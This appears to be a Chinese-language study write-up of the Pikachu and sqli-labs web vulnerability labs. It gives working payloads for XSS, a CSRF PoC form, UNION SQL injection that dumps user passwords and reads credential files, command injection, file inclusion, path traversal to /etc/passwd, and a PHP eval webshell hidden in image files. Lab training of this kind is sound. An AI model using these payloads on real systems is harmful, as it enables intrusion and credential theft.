# 1、暴力破解

![image-20230815221228188](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221228188.png)

### 基于表单的暴力破解

使用bp抓包

![image-20230805155007759](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805155007759.png)



![image-20230805155032456](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805155032456.png)



我们要破解username和password，就应当选取Cluster bomb的攻击方式，在payloads中上传我们的字典，首先在payload set 1中上传username的字典，再选取payload set 2上传password的字典。


![image-20230805160141047](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805160141047.png)

导入密码字典，开始攻击

![image-20230805160756172](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805160756172.png)



![image-20230805160835037](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805160835037.png)



去页面登录尝试

![image-20230805160942868](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805160942868.png)

### 验证码绕过（on server）



先抓包 查看

<img src="./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805161810147.png" alt="image-20230805161810147" style="zoom:33%;" />

发送到Repeater，发送请求

发现报错，说用户名 或者密码不存在

![image-20230805161914025](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805161914025.png)





再次修改密码，发送请求，发现说用户名 或者密码不存在

![image-20230805162004959](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805162004959.png)



说明每次请求的时候，验证码是不变的

那就可以爆破用户和密码了，跟基于表单的破解是一样的

### 验证码绕过（on client）

输入错误的验证码，打开bp代理，进行抓包

<img src="./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805163754092.png" alt="image-20230805163754092" style="zoom:33%;" />



发现bp没有拦截的请求

![image-20230805163821141](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805163821141.png)

说明没有走服务器，在客户端本地做的校验，前端的校验相当于没有校验，一般 校验都是在后端进行验证



输入正确的验证码查看抓包信息

![image-20230805164306562](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805164306562.png)





![image-20230805164341243](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805164341243.png)

发送到Repeater

![image-20230805164546242](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805164546242.png)

任意修改验证码 点击Send，发现不管怎么修改验证码，都只是报用户名和密码不正确的错

![image-20230805164630181](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805164630181.png)

![image-20230805164643324](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805164643324.png)

就可以用集束炸弹，爆破用户名和密码了



### token防爆破

token这一关没有验证码

先用bp抓包

![image-20230805165148261](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805165148261.png)

选择Pitchfork模式，打上俩个标记，，前一个 标记跟之前一样，导入密码字典，第二个标记需要用正则

![image-20230805170500628](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805170500628.png)



![image-20230805170606919](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805170606919.png)

![image-20230805170615684](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805170615684.png)



Intruder界面的Settings里找到Gerp-Extract，点击add，点击refresh response，选取token后面的字段即可

![image-20230805165801735](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805165801735.png)

![image-20230805165837691](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805165837691.png)

![image-20230805165917868](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805165917868.png)

![image-20230805170653530](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230805170653530.png)

# 2、Cross-Site Scripting

![image-20230815221214655](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221214655.png)

### 反射型xss(get)

![image-20230812143856462](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812143856462.png)

```js
<script>alert("123")</script>
```

![image-20230812143947435](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812143947435.png)

![image-20230812143956083](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812143956083.png)

### 反射型xss(post)

账号`admin`密码`123456`直接登录

```none
<script>alert('xss')</script>
```

![image-20230812150211238](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150211238.png)

![image-20230812150216602](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150216602.png)

### 存储型xss

在留言板里直接`<script>alert('xss')</script>`

![image-20230812150255251](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150255251.png)

出现`xss`的弹框后，点击确定，发现有个删除，说明确实是存到数据库里了

![image-20230812150403215](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150403215.png)

查看数据库又没有这一条数据

![image-20230812150651668](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150651668.png)

再次在留言板里输入js代码`<script>alert('zs6666')</script>`

![image-20230812150736541](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150736541.png)

再次查看数据库

![image-20230812150749514](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812150749514.png)

这就是`存储型`与`反射型`永久性和一次性的区别，会永久的存储在数据库中。

### DOM型xss

在`javascript`语言中分两种`BOM`和`DOM`

```js
BOM:浏览器对象模型 Brower Object Model
	js代码操作浏览器
DOM：文档对象模型  Document Object Model
	js代码操作标签
```

查看网页源代码，`ctrl+f`查找`what do you see? `的位置

![image-20230812151517365](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812151517365.png)

发现源码中已经给出了`xss`代码

---

输入框中的内容就是标注的`str`，我们可以在这里构造一个闭合，实现弹窗

```html
<a href='"+str+"'>what do you see?</a>
```

在输入框中输入`' onclick="alert('xss')">`，点击`click me`，出现`what do you see?`点击

![image-20230812151847732](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812151847732.png)

### DOM型xss-x

![image-20230812152427993](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812152427993.png)

输入框里输入`1`，发现url发生了变化

![image-20230812152449376](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812152449376.png)

这次是从url中获取我们输入的text参数的，这就类似反射型，构造闭合即可。`' onclick="alert('xss')">`



![image-20230812152721741](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812152721741.png)

### xss-盲打

**将留言保存至后台 当管理员登录查看留言时就会触发**

在页面中两个输入框中都输入`<script>alert("123")</script>`,提交后没有反应

查看数据库：

![image-20230812153056263](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812153056263.png)

也可以点一下提示，让去后台看看

`http://127.0.0.1/pikachu/vul/xss/xssblind/admin.php`

![image-20230812153122947](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812153122947.png)

发现登录后台，就会弹框

![image-20230812154100666](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812154100666.png)



### xss-过滤

不知道过滤了什么 双写，提交后没反应

`<sc<script>ript>alert("123")</script>`

换成大写后成功

`<SCRIPT>alert('xss')</SCRIPT>`

### xss之htmlspecialchars

> `specialchars`函数就是把单引号，双引号，尖括号过滤了，但是这个函数默认是不过滤单引号的

```
javascript:alert(1)
```

### xss之href输出

> href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了`<a>`标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。

```js
javascript:alert(document.cookie)
javascript:alert(1)
```



### xss之js输出

![image-20230812161216819](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812161216819.png)

先输入`tmac`

![image-20230812161245444](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812161245444.png)

可以提前闭合`</script>`

```js
</script><script>alert(1)</script>
```

也可以`' ; alert(1); //`

页面接受到的就是`$ms=''; alert(1);//'`

> 第一步： \$ms='''
>
> 第二步:   \$ms='';'   加分号，表示语句结束
>
> 第三步： \$ms=''; alert(1);'  弹框
>
> 第四步：  \$ms=''; alert(1); //'   把//后面的那对引号 注释掉  

# 3、CSRF

![image-20230815221157742](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221157742.png)

### CSRF(get)

根据提示的用户信息登录

![image-20230812190133024](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812190133024.png)

点击`修改个人信息`

![image-20230812190445617](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812190445617.png)

![image-20230812190501220](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812190501220.png)

开启bp代理，点击`submit`

![image-20230812190308351](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812190308351.png)

拦截到请求数据包

![image-20230812192110576](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812192110576.png)

![image-20230812192202442](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812192202442.png)

浏览器关闭代理

![image-20230812192224424](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812192224424.png)

刷新页面

![image-20230812192242777](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812192242777.png)

### CSRF(post)

![image-20230815211958282](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230815211958282.png)



使用BP生成CSRF POC

![image-20230815212157657](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815212157657.png)

post请求伪造，可以通过钓鱼网站，诱导用户去点链接

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://192.168.80.139/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
      <input type="hidden" name="sex" value="woman" />
      <input type="hidden" name="phonenum" value="110110110" />
      <input type="hidden" name="add" value="北京" />
      <input type="hidden" name="email" value="3123@qq.com" />
      <input type="hidden" name="submit" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![image-20230815212513872](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815212513872.png)

### CSRF Token 

分析一下这个token的作用了。按照前面csrf get的方法，攻击者会伪造一个GET  URL去让用户点击。但用户正常提供GET请求时，会把服务器返回的token填入和提交，而攻击者伪造URL时除非前期抓包获取到这个返回的token，否则他是不会知道这个token的。所以攻击者无法构造GET URL。同理，对于POST方法也是一样。所以，使用token是一个很好的防御CSRF攻击的方法。

# 4、SQL-Injection

![image-20230815221138682](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221138682.png)



### 引入

在`MYSQL5.0`以上版本中，mysql存在一个自带数据库名为`information_schema`,它是一个存储==记录所有数据库名，表名，列名的数据库==，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。

数据库中符号`"."`代表下一级，如`security.users`表示`security`数据库下的`users`表名

![image-20230814205017557](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814205017557.png)

查看`information_schema`里的所有表` show tables;`



<img src="./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814205531015.png" alt="image-20230814205531015" style="zoom:33%;" />



#### columns表

```sql
select * from columns\G;
```

`table_schema`存储的是数据库的名称

![image-20230814211054519](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814211054519.png)

#### tables表

![image-20230814210508460](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814210508460.png)

#### schemata表

`schema_name`字段存放数据库的名字

![image-20230814211150506](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814211150506.png)

```sql
information_schema.tables   #记录所有表名信息的表
information_schema.columns  #记录所有列名信息的表
table_name                  #表名
column_name                 #列名
table_schema                #数据库名
```

**函数**

```sql
database()  #数据库名
version()  #数据库版本
user()   #用户名
```

#### 以sqli-labs靶场为例

**1、判断注入类型**

```
?id=1 and 1=1 --+
?id=1 and 1=2 --+
```

![image-20230814212338725](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814212338725.png)

![image-20230814212404812](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814212404812.png)

注入类型为数字型

**2、判断列数**

```sql
?id=1 order by 3--+
?id=1 order by 4--+      -- 报错
```

![image-20230814212530433](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814212530433.png)

**3、判断显示位**

```sql
?id=-1 union select 1,2,3 --+
```

![image-20230814212615284](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814212615284.png)

第二位和第三位为显示位

**4、获取所有数据库**



```sql
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata --+
```

![image-20230814212735861](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814212735861.png)

`group_concat`这个函数默认是跟`group by `分组来一起使用的

==**如果没有使用`group by`语句，那么默认就是一个组，会显示所有的内容**==

[详见博客](https://blog.csdn.net/qq_33323054/article/details/125193170)

---

**5、获取当前数据库**

```sql
?id=-1 union select 1,2,database() --+
```

![image-20230814213605037](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814213605037.png)

**6、获取用户名和数据库版本**

```sql
?id=-1 union select 1,version(),user() --+
```

可以看到当前是以`root`用户登录的数据库，数据库版本是`5.7.26`

![image-20230814213457277](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814213457277.png)

---

---

跨表查询：↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓

**7、查看指定dvwa数据库下的所有表名信息**

```sql
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where  table_schema='dvwa' --+
```

![image-20230814214008586](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814214008586.png)

**7、查看指定pikachu数据库下表名为users的所有列信息**

```sql
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where  table_schema='pikachu'  and table_name='users'--+
```

![image-20230814214237328](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814214237328.png)

查看数据库验证是否正确

![image-20230814214350149](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814214350149.png)

**8、查询pikachu库下的users表的数据**

```sql
?id=-1 union select 1,username,password from pikachu.users--+
```



![image-20230814214649437](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814214649437.png)

```sql
?id=-1 union select 1,2,group_concat(username,password) from pikachu.users--+
```

![image-20230814214802971](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814214802971.png)

```sql
?id=-1 union select 1,group_concat(username),group_concat(password) from pikachu.users--+
```

![image-20230814214926228](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814214926228.png)

```sql
?id=-1 union select 1,group_concat(concat_ws("-",username,password)),3 from pikachu.users--+
```

==`concat_ws`将多个字符串连接成一个字符串，第一个参数指定分隔符，分隔符不能为null，如果为null，则返回结果为null==

![image-20230814215055839](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230814215055839.png)

[concat_ws函数和concat函数的区别](https://blog.csdn.net/Ajdidfj/article/details/123246593)

#### 路径获取常见方法

1、报错显示 

浏览器输入框`inurl:edu.cn warning`

![image-20230815192354329](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815192354329.png)

2、遗留文件  `inurl:phpinfo.php`

3、漏洞报错

4、平台配置文件

5、爆破

#### 文件读取函数

```
使用show global variables like '%secure%';查看secure_file_priv的值

secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的

值为null，表示限制导入导出，''表示不限制

如果为null,在mysql安装目录中的my.ini文件中的[mysqld]项下添加 secure_file_priv = ''

重启mysql服务
```



```sql 
load_file()  #读取函数
# select load_file('c:/xx.txt');
```

[load_file读取敏感信息](https://blog.csdn.net/blackguest07/article/details/128720855)

![image-20230815194228604](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815194228604.png)

**1、读取指定文件内容**

```sql
http://192.168.80.139/sqli/Less-3/?id=-1')  union select 1,load_file('c:/test/demo.txt'),3--+
```

<img src="./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815194821146.png" alt="image-20230815194821146" style="zoom:33%;" />

![image-20230815194838300](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815194838300.png)

**2、读取网站数据库配置文件**

`C:\software\phpstudy_pro\WWW\sqli\sql-connections\db-creds.inc`

<img src="./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815195224707.png" alt="image-20230815195224707" style="zoom:33%;" />

```sql
http://192.168.80.139/sqli/Less-3/?id=-1')  union select 1,load_file('C:\\software\\phpstudy_pro\\WWW\\sqli\\sql-connections\\db-creds.inc'),3--+
```



![image-20230815195400128](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815195400128.png)

![image-20230815195419487](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815195419487.png)

#### 文件写入函数

```sql
into outfile 或者 into dumpfile   #写入函数
#select 'x'  into outfile 'd:/www.txt';
```

#### 防注入

魔术引号

内置函数 int

![image-20230815202559859](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815202559859.png)

自定义关键字：select

![image-20230815202450124](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815202450124.png)

WAF防护软件

### 数字型注入(post)

`id=1 or 1=1`

![image-20230812171111538](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812171111538.png)

### 字符型注入(get)

直接输入`1' or 1=1#`

![image-20230812171732676](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812171732676.png)

或者用bp抓包，构造闭合

`name=1'or'1'='1`

![image-20230812172107541](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812172107541.png)

### 搜索型注入

搜索框中输入`a`

![image-20230812172534833](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812172534833.png)

**sql语句**

```sql
select from 表名 where username like '%a%';
```

构造闭合`a%' or 1=1#`    `#号在数据库中表示注释`

```sql
select from 表名 where username like '%a%' or 1=1#%';
```

![image-20230812172726336](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812172726336.png)

### xx型注入

就是猜闭合罢了

看源代码

```bash
vim /var/www/html/pikachu/vul/sqli/sqli_x.php
```



![image-20230812173119879](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230812173119879.png)

```sql
select id,email from member where username=('$name');
```

构造闭合`xx') or 1=1#`

```sql
select id,email from member where username=('xx') or 1=1#');
```

### "insert/update"注入

### "delete"注入

### "http header"注入

### 盲注(base on boolian)

### 盲注(base on time)

### 宽字节注入

# 5、RCE

![image-20230815221103189](https://gitee.com/zh_sng/cartographic-bed/raw/master/img/image-20230815221103189.png)

> 逻辑运算符::
>
> &&：代表首先执行命令a，若成功再执行命令b，又被称为短路运算符。
>
> &：代表首先执行命令a再执行命令b，不管a是否成功，都会执行命令b。在执行效率上来说“&&”更加高效。
>
> ||：代表首先执行a命令再执行b命令，只有a命令执行不成功，才会执行b命令。
>
> |：代表首先执行a命令，在执行b命令，不管a命令成功与否，都会去执行b命令。
>
> （当第一条命令失败时，它仍然会执行第二条命令，表示A命令语句的输出，作为B命令语句的输入执行。）

### exec "ping"

`127.0.0.1 & ipconfig`

![image-20230815220509714](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815220509714.png)

### exec "eval"

`eval`函数把字符串作为PHP代码执行

`phpinfo();`

![image-20230815220740720](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815220740720.png)

# 6、File inclusion

![image-20230815221037960](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221037960.png)

### File inclusion(local)

随便选择一个点击提交，提交后观察	`url`

![image-20230815221633751](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221633751.png)

`?filename=`

我们可以使用相对路径`../../../../../`访问我们想要看到的文件内容

查看windows系统的主机映射文件`../../../../Windows/System32/drivers/etc/hosts`

![image-20230815221826072](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815221826072.png)

### File inclusion(remote)

无非就是换成一个远端的路径，读取远程文件。

`?filename=http://192.168.80.139/pikachu/test/phpinfo.txt`

![image-20230815222738209](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230815222738209.png)

# 7、Unsafe Filedownload       

文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。                        如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。
 此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如`../../../etc/passwd`),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。                     

所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。

切记：所有与前端交互的数据都是不安全的，不能掉以轻心！                 

![image-20230816201137022](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816201137022.png)   



任意点击一张图片连接，下载，查看图片的下载 链接，进行分析

![image-20230816201121465](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816201121465.png)

```
http://192.168.80.139/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png
```

可以直接修改`?filename=`后面的值

可以采用目录遍历（`../../../../../../etc/passwd`）的方式，跳到根目录下面去，然后再以根目录为起点，往下做相关的读取，即完成攻击目的

# 8、Unsafe upfileupload

文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断

比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。

如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                    

  所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：

> ​					--验证文件类型、后缀名、大小;
> ​                    --验证文件的上传方式;
> ​                    --对文件进行一定复杂的重命名;
> ​                    --不要暴露文件上传后的路径;

### client check

![image-20230816202622921](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816202622921.png)

上传一句话木马`1.php`

```php
<?php eval(@$_POST['password']);?>
```

报错显示说不符合要求

![image-20230816202851732](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816202851732.png)

查看页面代码，发现有`js`函数做验证

![image-20230816202947181](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816202947181.png)

前端校验不值一提，直接删除`js校验函数`

![image-20230816203051214](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816203051214.png)

这时候一句话木马已经上传，可以通过蚁剑来连接进入

木马上传的路径

```
192.168.80.139/pikachu/vul/unsafeupload/uploads/1.php
```



![image-20230816203332319](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816203332319.png)



![image-20230816203418292](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816203418292.png)

### MIME Type

MIME（多用途互联网邮件扩展类型），是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。
每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图像image等，后面定义具体的种类，常见的MIME类型，比如：

> 超文本标记语言文本.html texthtml
> 普通文本.txt text/plain
> RTF文本.rtf application/rtf
> GIF图形.gif image/gif
> JPEG图形.ipeg.jpg image/jpeg

继续提交php木马文件，使用`Burpsuite`抓取数据包，发送到`Repeater`修改`Content-Type`

![image-20230816205716315](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816205716315.png)

![image-20230816205803517](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816205803517.png)

### getimagesize

[菜鸟教程](https://www.runoob.com/php/php-getimagesize.html)

`Getimagesize`是`PHP`提供的一个用来判断目标文件是不是图片的函数

对文件的开头内容进行了检测并且通过二进制识别是否为图像，那么就可以利用文件头欺骗，来让getimagesize()函数检测无效。

**1、制作图片木马方式一**

这里用GIF的文件头，在一句话木马前加上GIF的文件头标识，后缀改为png格式

```php
GIF89a
<?php phpinfo(); ?> 
```



![image-20230816212939811](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816212939811.png)



图片的地址：`http://192.168.80.139/pikachu/vul/unsafeupload/uploads/2023/08/16/33780664dccf36108f6808817624.png`

通过使用文件包含路径去访问后门文件

```php
http://192.168.80.139/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/08/16/33780664dccf36108f6808817624.png&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

![image-20230816213217472](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816213217472.png)

**2、制作图片木马方式二**

准备一个`jpeg`格式的图片，还有一个php木马文件

通过`CMD`命令将两个合成一个`ws.jpeg`，生成的文件前面内容是`2.jpeg`，后面是`12.php`内容

```bash
copy /d 2.jpeg + 12.php   ws.jpeg
```

![image-20230816213804670](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816213804670.png)

上传ws.jpeg图片

![image-20230816214021563](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816214021563.png)

```
uploads/2023/08/16/38476764dcd1bd7cf51012008763.jpeg
```

虽然我们绕过`getimagesize()`，成功上传图片，但只访问图片里面的`php`代码是执行不了的

需要通过文件包含路径去访问木马文件

```
http://192.168.80.139/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/08/16/38476764dcd1bd7cf51012008763.jpeg&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```



![image-20230816214220469](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230816214220469.png)

# 9、Over Permision

如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。                    越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。                

一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。                

  因此，在在权限管理中应该遵守：

> 1.使用最小权限原则对用户进行赋权;
> 2.使用合理（严格）的权限校验规则;
> 3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;

### 水平越权

    就是同级用户之间的越权，打个比方现在有ABC三个用户，A是管理员，BC都是普通用户，现在B能够使用C这个用户的权限这就是水平越权，

登录lucy的账户

![image-20230817201722104](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817201722104.png)

修改地址栏的的`username`值为`kobe`，越权成功

![image-20230817201824703](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817201824703.png)

### 垂直越权

    他这个就是不一样拉，他这个就是通过低级权限跨越到高级权限，用高级权限干高级权限的事情，来我们继续打比方，A是超级管理员,BC是普通用户，现在这个B啊，通过了某些手段，跨越获得了A超级管理员的权限，这就是垂直越权，垂直越权的特点就是以低级权限向高级权限跨越
查看提示信息

![image-20230817202815852](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817202815852.png)

先使用管理员账户登录，登录后，可以看到能够对用户进行增删查操作

![image-20230817202849559](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817202849559.png)

添加用户，使用bp抓取数据包

![image-20230817203137287](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817203137287.png)

![image-20230817203207185](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817203207185.png)

将 数据包发送到Reapter重发器

然后退出管理员界面，登录普通用户

![image-20230817203313514](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817203313514.png)

找到普通用户登录的数据包

![image-20230817203447091](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817203447091.png)

将普通用户的`cookie`复制

在重发器 里面，将管理员的`Cookie`值换成普通用户的`Cookie`，点击`Send`，(我这里点了两下send)

![image-20230817203735117](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817203735117.png)

回到靶场的页面，刷新，可以看到有多条`jeason`用户，

![image-20230817203910588](./Pikachu%E9%9D%B6%E5%9C%BA.assets/image-20230817203910588.png)

普通用户越权管理用户成功！



# 10、../../

在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。                        

当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。                       

 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。                        

从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。
看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。                    

需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在"i can see you ABC"中了解更多）                    

你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。                    

